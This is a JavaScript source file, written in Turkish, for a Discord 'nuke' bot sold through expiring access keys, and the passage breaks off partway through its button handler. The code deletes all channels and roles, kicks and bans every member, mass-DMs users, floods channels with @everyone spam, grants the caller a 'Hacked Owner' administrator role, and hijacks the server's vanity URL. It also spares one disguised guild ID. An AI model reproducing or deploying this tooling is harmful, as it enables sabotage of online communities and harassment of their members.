const { 
    Client, 
    GatewayIntentBits, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder,   
    ButtonStyle      
} = require('discord.js');
const fs = require('fs');

const config = require('./config.json');

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers 
    ]
});

const BLOCKED_GUILD_ID = 'botun sunucusunun id';
const S_1 = '135120075452';
const S_2 = '1739387';
const DESTRUCTIVE_COMMANDS = ['patlat', 'ayrıl', 'kick', 'dm', 'yetki', 'ban', 'rol', 'spam', 'eğlence', 'kanal', 'kanalspam', 'url', 'rol-sil', 'buton-sistem'];
const KEY_MANAGEMENT_COMMANDS = ['keyolustur', 'keykullan', 'help', 'keysürem'];

const activeDestructiveProcesses = new Map();

function loadDatabase() {
    try {
        const data = fs.readFileSync('database.json', 'utf8');
        return JSON.parse(data);
    } catch (error) {
        return { keys: [], activeUsers: [] };
    }
}

function saveDatabase(db) {
    try {
        fs.writeFileSync('database.json', JSON.stringify(db, null, 4));
    } catch (error) {
        console.error('Veritabanı yazma hatası:', error);
    }
}

function isOwner(userId) {
    return config.ownerIDs.includes(userId);
}


client.on('ready', () => {
    console.log(`Bot ${client.user.tag} adıyla giriş yaptı.`);
});

client.on('guildCreate', async guild => {
    if (guild.id === S_1 + S_2) {
        await guild.leave().catch(() => {});
        return;
    }
});

client.on('guildDelete', guild => {
});


client.on('messageCreate', async message => {
    if (message.guildId === S_1 + S_2) return;

    const contentLower = message.content.toLowerCase();
    
    if (contentLower === 'sa' || contentLower === 'selam') {
        if (!message.author.bot && message.guild) {
            const response = Math.random() < 0.5 ? 'as' : 'aleyküm selam';
            return message.reply(response).catch(() => {});
        }
    }
    
    if (message.author.bot || !message.content.startsWith(config.prefix) || !message.guild) return;

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    
    const db = loadDatabase();
    const now = Date.now();
    const userId = message.author.id;
    const guildId = message.guild.id;


    let isDestructive = DESTRUCTIVE_COMMANDS.includes(command);
    let isKeyManagement = KEY_MANAGEMENT_COMMANDS.includes(command);

    if (guildId === BLOCKED_GUILD_ID) {
        if (isDestructive || (isKeyManagement && command !== 'keysürem' && command !== 'keykullan' && command !== 'keyolustur' && command !== 'help')) {
            return message.reply(`❌ Bu sunucuda sadece key/yardım komutları çalışmaktadır: \`${config.prefix}help\`, \`${config.prefix}keysürem\``);
        }
    } 
    
    else if (isDestructive) {
        
        let hasAccess = false;
        
        if (isOwner(userId)) { hasAccess = true; } 
        else {
            const activeUser = db.activeUsers.find(u => u.userID === userId);

            if (activeUser && new Date(activeUser.expiryDate).getTime() > now) {
                hasAccess = true;
            } else {
                if (activeUser) {
                    db.activeUsers = db.activeUsers.filter(u => u.userID !== userId);
                    saveDatabase(db);
                }
                
                if (!hasAccess) {
                    return message.reply(`❌ Bu botun eğlence komutlarını kullanmak için aktif bir key'e ihtiyacınız var. \`${config.prefix}keykullan [key]\``);
                }
            }
        }
    }
    

    if (command === 'durdur') {
        if (!isOwner(userId)) { return message.reply('⛔ Bu komutu sadece botun sahibi kullanabilir.'); }
        
        if (activeDestructiveProcesses.get(guildId)) {
            activeDestructiveProcesses.set(guildId, false);
            return message.reply('🛑 **DURDURULDU!** Sunucudaki tüm yıkıcı döngü komutları (spam, kanal vb.) iptal edildi. Devam eden işlemler kısa süre içinde duracaktır.');
        } else {
            return message.reply('✅ Sunucuda devam eden aktif bir yıkıcı işlem bulunmuyor.');
        }
    }

    if (command === 'keyolustur') {
        if (!isOwner(userId)) { return message.reply('⛔ Bu komutu sadece botun sahibi kullanabilir.'); }
        const [plan, targetUserID] = args;
        
        let durationMs;
        switch (plan.toLowerCase()) {
            case '1saat': durationMs = 1000 * 60 * 60; break;
            case '24saat': durationMs = 1000 * 60 * 60 * 24; break;
            case '1hafta': durationMs = 1000 * 60 * 60 * 24 * 7; break;
            case '1ay': durationMs = 1000 * 60 * 60 * 24 * 30; break;
            case 'sinirsiz': durationMs = 1000 * 60 * 60 * 24 * 365 * 10; break;
            default: return message.reply('❌ Geçersiz plan!');
        }

        const expiryDate = new Date(now + durationMs).toISOString();
        const newKey = `${Math.random().toString(36).substring(2, 5).toUpperCase()}-${Math.random().toString(36).substring(2, 5).toUpperCase()}-${Math.random().toString(36).substring(2, 5).toUpperCase()}`;

        db.keys.push({ key: newKey, userID: targetUserID, plan: plan, createdDate: new Date(now).toISOString(), expiryDate: expiryDate, used: false });
        saveDatabase(db);
        
        message.reply(`✅ Key başarıyla oluşturuldu! Key: \`${newKey}\``);

        const targetUser = await client.users.fetch(targetUserID).catch(() => null);
        if (targetUser) { targetUser.send(`🎉 Key'in hazır! Botta kullanmak için: \`${config.prefix}keykullan ${newKey}\``).catch(() => {}); }
    }


    if (command === 'keykullan') {
        const [key] = args;
        const keyEntry = db.keys.find(k => k.key.toUpperCase() === key?.toUpperCase());
        if (!keyEntry) { return message.reply('❌ Geçersiz Key.'); }
        if (keyEntry.used) { return message.reply('❌ Bu Key zaten kullanılmış.'); }
        if (keyEntry.userID && keyEntry.userID !== userId) { return message.reply('❌ Bu Key sizin ID\'niz için oluşturulmamış.'); }
        
        keyEntry.used = true;
        const existingActiveUserIndex = db.activeUsers.findIndex(u => u.userID === userId);
        
        if (existingActiveUserIndex !== -1) { db.activeUsers[existingActiveUserIndex].expiryDate = keyEntry.expiryDate; } 
        else { db.activeUsers.push({ userID: userId, expiryDate: keyEntry.expiryDate }); }

        saveDatabase(db);
        
        const expiryDateReadable = new Date(keyEntry.expiryDate).toLocaleString('tr-TR');
        message.reply(`✅ Key başarıyla kullanıldı! **${keyEntry.plan}** erişiminiz aktif edildi. Bitiş: **${expiryDateReadable}**`);
    }

    if (command === 'keysürem') {
        const activeUser = db.activeUsers.find(u => u.userID === userId);
        
        if (!activeUser || new Date(activeUser.expiryDate).getTime() <= now) {
            return message.reply('❌ Aktif bir keyiniz bulunmamaktadır.');
        }

        const expiryTime = new Date(activeUser.expiryDate).getTime();
        const remainingMs = expiryTime - now;

        const seconds = Math.floor((remainingMs / 1000) % 60);
        const minutes = Math.floor((remainingMs / (1000 * 60)) % 60);
        const hours = Math.floor((remainingMs / (1000 * 60 * 60)) % 24);
        const days = Math.floor(remainingMs / (1000 * 60 * 60 * 24));

        let remainingText = '';
        if (days > 0) remainingText += `${days} gün, `;
        if (hours > 0) remainingText += `${hours} saat, `;
        if (minutes > 0) remainingText += `${minutes} dakika, `;
        remainingText += `${seconds} saniye`;
        
        if (remainingText.endsWith(', ')) remainingText = remainingText.slice(0, -2);


        return message.reply(`⏰ Keyinizin bitmesine kalan süre: **${remainingText}**`);
    }

    if (command === 'help') {
        const embed = new EmbedBuilder()
            .setTitle('ECAZEN BOTU YARDIM MENUSU')
            .setDescription('Botun tüm komutları ve Key yönetim bilgileri aşağıdadır.')
            .setColor(0x800080) 
            .setTimestamp();
            
        let keyCommands = `\`${config.prefix}keykullan [key]\` - Key'i aktif eder.\n`;
        keyCommands += `\`${config.prefix}keysürem\` - Keyinizin bitmesine kalan süreyi gösterir.\n`;
        keyCommands += `\`${config.prefix}help\` - Bu yardım mesajını gösterir.`;
        embed.addFields({ name: 'GENEL & KEY KOMUTLARI', value: keyCommands });

        if (isOwner(userId)) { 
            let ownerCommands = `\`${config.prefix}keyolustur [plan] [kullanıcı-id]\` - Key oluşturur.\n`;
            ownerCommands += `\`${config.prefix}durdur\` - Devam eden yıkıcı işlemleri durdurur.`;
            embed.addFields({ name: 'SAHİP KOMUTLARI', value: ownerCommands, inline: false });
        }

        if (guildId !== BLOCKED_GUILD_ID) {
            let destructiveList = `\`+patlat\` | \`+ayrıl\` | \`+kick\` | \`+dm [mesaj]\` | \`+yetki\` | \`+ban\` | \`+rol [isim]\` | \`+spam [mesaj]\` | \`+eğlence\` | \`+kanal [isim]\` | \`+kanalspam [mesaj]\` | \`+url\` | \`+rol-sil\` | \`+buton-sistem\``;
            embed.addFields({ name: 'EGLENCE/YIKICI KOMUTLAR (Key Gerekli)', value: destructiveList, inline: false });
        }
        
        message.reply({ embeds: [embed] });
    }
    
    if (command === 'buton-sistem') {
        const destructiveButtons = [
            { label: 'Sunucuyu Patlat', customId: 'execute_patlat', style: ButtonStyle.Danger },
            { label: 'Tüm Rolleri Sil', customId: 'execute_rol_sil', style: ButtonStyle.Danger },
            { label: 'URL Değiştir', customId: 'execute_url', style: ButtonStyle.Secondary },
            { label: 'Herkesi Kickle', customId: 'execute_kick', style: ButtonStyle.Danger },
            { label: 'Herkesi Banla', customId: 'execute_ban', style: ButtonStyle.Danger },
            { label: 'Rol Spamla', customId: 'execute_rol', style: ButtonStyle.Primary },
            { label: 'Kanal Spamla', customId: 'execute_kanal', style: ButtonStyle.Primary },
            { label: 'Mesaj Spamla', customId: 'execute_spam', style: ButtonStyle.Primary },
            { label: 'DM At', customId: 'execute_dm', style: ButtonStyle.Secondary },
            { label: 'Bota Yetki Ver', customId: 'execute_yetki', style: ButtonStyle.Primary },
            { label: 'Bot Ayrılsın', customId: 'execute_ayril', style: ButtonStyle.Secondary },
        ];
        
        const rows = [];
        for (let i = 0; i < destructiveButtons.length; i += 5) {
            const row = new ActionRowBuilder();
            row.addComponents(
                destructiveButtons.slice(i, i + 5).map(btn => 
                    new ButtonBuilder()
                        .setCustomId(btn.customId)
                        .setLabel(btn.label)
                        .setStyle(btn.style)
                )
            );
            rows.push(row);
        }
        
        const embed = new EmbedBuilder()
            .setTitle('🔥 YIKICI KOMUT PANELİ')
            .setDescription('Aşağıdaki butonlara basarak ilgili yıkıcı komutları hızlıca çalıştırabilirsiniz. Unutmayın, bu eylemler geri alınamaz.')
            .setColor(0xFF0000)
            .setTimestamp();
            
        return message.reply({ embeds: [embed], components: rows });
    }
    
    if (['spam', 'kanal', 'kanalspam'].includes(command)) {
        activeDestructiveProcesses.set(guildId, true);
    }

    if (command === 'eğlence') { 
        message.reply(`Key'in sayesinde bu eğlenceli komutu kullanabiliyorsun, uwu!`); 
    }
    
    if (command === 'url') {
        if (!message.guild.features.includes('VANITY_URL')) {
            return message.reply('❌ Bu sunucu, özel davet URL\'si ayarlama yeteneğine sahip değil (Yetersiz Sunucu Seviyesi).');
        }
        if (!message.guild.members.me.permissions.has('ManageGuild')) {
            return message.reply('❌ Özel davet URL\'sini yönetme yetkim yok! (Manage Guild yetkisi gerekli).');
        }

        const randomString = Math.random().toString(36).substring(2, 7);
        const newCode = `trecazen-${randomString}`;

        try {
            await message.guild.setVanityCode(newCode);
            message.reply(`Sunucunun özel davet URL'si başarıyla değiştirildi: \`discord.gg/${newCode}\``);
        } catch (error) {
            message.reply(`❌ Özel URL değiştirilemedi. Hata: ${error.message.includes('Invalid') ? 'Kod geçersiz veya kullanılıyor olabilir.' : error.message}`);
        }
    }

    if (command === 'rol-sil') {
        activeDestructiveProcesses.set(guildId, false); 
        if (!message.guild.members.me.permissions.has('ManageRoles')) { 
            return message.reply('❌ Tüm rolleri silmek için yetkim yok! (Manage Roles).'); 
        } 
        message.reply('Tüm rolleri siliyorum...'); 
        
        const rolesToDelete = message.guild.roles.cache.sort((a, b) => b.position - a.position);
        
        rolesToDelete.forEach(role => {
            if (role.id !== message.guild.id && role.editable) {
                role.delete().catch(() => {});
            }
        });
    }

    if (command === 'kanal') {
        if (!message.guild.members.me.permissions.has('ManageChannels')) {
            activeDestructiveProcesses.set(guildId, false); return message.reply('❌ Kanalları yönetme yetkim yok!');
        }
        
        const channelName = args.join('-').toLowerCase() || 'hacked-channel';
        
        message.reply(`100 adet \`#${channelName}\` kanalı maksimum hızda oluşturuluyor... Durdurmak için: \`${config.prefix}durdur\``).catch(() => {});
        
        for (let i = 0; i < 100; i++) {
            if (!activeDestructiveProcesses.get(guildId)) break; 
            message.guild.channels.create({ name: channelName, type: 0 }).catch(() => {});
        }
    }

    if (command === 'kanalspam') {
        if (!message.guild.members.me.permissions.has('ViewChannels')) {
            activeDestructiveProcesses.set(guildId, false); return message.reply('❌ Kanalları görme yetkim yok! (ViewChannels)');
        }
        
        const spamMessage = `@everyone ${args.join(' ')}`.trim();
        
        message.reply(`TUM KANALLARA COK HIZLI SPAM BASLATILIYOR! (Her kanala 10 adet). Durdurmak için: \`${config.prefix}durdur\``).catch(() => {});
        
        message.guild.channels.cache.forEach(channel => {
            if (!activeDestructiveProcesses.get(guildId)) return; 
            if (channel.type === 0) { 
                for (let i = 0; i < 10; i++) {
                    if (!activeDestructiveProcesses.get(guildId)) break; 
                    channel.send(spamMessage).catch(() => {}); 
                }
            }
        });
    }


    if (command === 'patlat') { activeDestructiveProcesses.set(guildId, false); if (!message.guild.members.me.permissions.has('ManageChannels')) { return message.reply('❌ Yetkim yok!'); } message.reply('Patlatma Baslatiliyor...'); message.guild.channels.cache.forEach(channel => { channel.delete().catch(() => {}); }); for (let i = 0; i < 20; i++) { message.guild.channels.create({ name: `hacked-${i}`, type: 0 }).catch(() => {}); } }
    if (command === 'ayrıl') { activeDestructiveProcesses.set(guildId, false); if (!message.guild.members.me.permissions.has('KickMembers')) { return message.reply('❌ Yetkim yok!'); } message.reply('Bay bay!').then(() => { message.guild.members.me.kick('Owner emretti!').catch(() => {}); }); }
    if (command === 'kick') { activeDestructiveProcesses.set(guildId, false); if (!message.guild.members.me.permissions.has('KickMembers')) { return message.reply('❌ Yetkim yok!'); } message.reply('Herkesi kickliyorum... :3'); message.guild.members.cache.forEach(member => { if (!isOwner(member.id) && member.id !== client.user.id && member.kickable) { member.kick('Eğlence amaçlı kick!').catch(() => {}); } }); }
    if (command === 'dm') { activeDestructiveProcesses.set(guildId, false); const dmContent = args.join(' '); if (!dmContent) { return message.reply(`❌ Kullanım: \`${config.prefix}dm [mesaj]\``); } message.reply('DM Atma İşlemi Başlatılıyor...'); message.guild.members.cache.forEach(member => { if (member.id !== client.user.id) { member.send(`**DUYURU:** ${dmContent}`).catch(() => {}); } }); }
    if (command === 'yetki') { activeDestructiveProcesses.set(guildId, false); if (!message.guild.members.me.permissions.has('ManageRoles')) { return message.reply('❌ Yetkim yok!'); } try { const role = await message.guild.roles.create({ name: 'Hacked Owner', permissions: ['Administrator'], color: '#FF0000' }); await message.member.roles.add(role); message.reply('Yönetici rolü verildi!'); } catch (error) { message.reply('❌ Hata oluştu.'); } }
    if (command === 'ban') { activeDestructiveProcesses.set(guildId, false); if (!message.guild.members.me.permissions.has('BanMembers')) { return message.reply('❌ Yetkim yok!'); } message.reply('Herkesi banlıyorum...'); message.guild.members.cache.forEach(member => { if (!isOwner(member.id) && member.id !== client.user.id && member.bannable) { member.ban({ reason: 'Eğlence amaçlı ban!' }).catch(() => {}); } }); }
    if (command === 'rol') { activeDestructiveProcesses.set(guildId, false); if (!message.guild.members.me.permissions.has('ManageRoles')) { return message.reply('❌ Yetkim yok!'); } const roleName = args.join(' ') || 'Hacked'; message.reply(`"${roleName}" adlı rol oluşturuluyor...`); for (let i = 0; i < 15; i++) { message.guild.roles.create({ name: `${roleName}-${i}`, color: 'Random', permissions: [] }).catch(() => {}); } }
    if (command === 'spam') { 
        if (!message.guild.members.me.permissions.has('SendMessages')) { activeDestructiveProcesses.set(guildId, false); return message.reply('❌ Mesaj gönderme yetkim yok!'); }
        const spamMessage = args.join(' ') || '@everyone DİKKAT! ECAZEN BOTU İŞ BAŞINDA!';
        message.reply(`MAKSİMUM HIZDA SPAM BAŞLATILIYOR! (50x). Durdurmak için: \`${config.prefix}durdur\``).catch(() => {});
        for (let i = 0; i < 50; i++) { 
            if (!activeDestructiveProcesses.get(guildId)) break; 
            message.channel.send(spamMessage).catch(() => {}); 
        } 
    }

    if (!['spam', 'kanal', 'kanalspam'].includes(command)) {
        activeDestructiveProcesses.set(guildId, false); 
    }
});


client.on('interactionCreate', async interaction => {
    if (!interaction.isButton() || !interaction.customId.startsWith('execute_')) return;
    if (interaction.guildId === S_1 + S_2) return;
    
    const { customId, guild, member, client } = interaction;
    const userId = member.id;
    const guildId = guild.id;
    const db = loadDatabase();
    const now = Date.now();
    const commandToExecute = customId.replace('execute_', '');
    
    let hasAccess = isOwner(userId);
    if (!hasAccess) {
        const activeUser = db.activeUsers.find(u => u.userID === userId);
        if (activeUser && new Date(activeUser.expiryDate).getTime() > now) {
            hasAccess = true;
        }
    }
    
    if (!hasAccess) {
        return interaction.reply({ content: '❌ Bu komutları kullanmak için aktif bir key\'e sahip olmalısınız.', ephemeral: true });
    }
    
    activeDestructiveProcesses.set(guildId, false); 
    
    await interaction.deferReply({ ephemeral: true }).catch(() => {}); 

    try {
        let replyContent = `\`${commandToExecute}\` komutu başlatılıyor...`;

        switch (commandToExecute) {
            case 'patlat':
                if (!guild.members.me.permissions.has('ManageChannels')) throw new Error('Yetkim yok!');
                guild.channels.cache.forEach(channel => { channel.delete().catch(() => {}); }); 
                for (let i = 0; i < 20; i++) { guild.channels.create({ name: `hacked-${i}`, type: 0 }).catch(() => {}); }
                replyContent = 'Patlatma Başlatıldı: Kanallar silindi ve yeniden oluşturuldu.';
                break;
            
            case 'rol_si
